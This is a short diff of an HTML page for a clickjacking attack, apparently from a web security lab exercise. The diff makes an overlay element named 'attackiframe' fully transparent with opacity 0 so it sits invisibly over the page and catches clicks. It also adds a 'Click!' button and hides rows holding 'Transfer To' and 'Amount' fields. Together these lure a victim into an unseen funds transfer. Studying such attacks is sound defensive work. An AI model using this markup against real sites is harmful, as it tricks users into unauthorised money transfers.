@@ -11,8 +11,8 @@
        <style type="text/css">
             #attackiframe
             {
-                z-index: 1000;
-                visibility: hidden;
+                z-index: 2;
+                opacity: 0;
                 position:absolute; left: 0; right: 0; bottom: 0; top: 0px; 
             }
         </style>
@@ -44,19 +44,19 @@
   </p>
 
   <table>
-    <tr>
-      <td style="visibility:hidden">Transfer To:</td><td>
+    <tr style="visibility:hidden">
+      <td>Transfer To:</td><td>
       <input type="text" name="destination_username" value="" style="visibility:hidden"/>
       </td>
     </tr>
-    <tr>
-      <td style="visibility:hidden">Amount:</td><td>
+    <tr style="visibility:hidden">
+      <td>Amount:</td><td>
       <input type="text" name="quantity" value="" style="visibility:hidden"/>
       </td>
     </tr>
     <tr>
       <td>
-      <input type="submit" value="Click!" style="z-index=-10"/>
+      <input type="submit" value="Click!" />
       </td>
     </tr>
   </table>
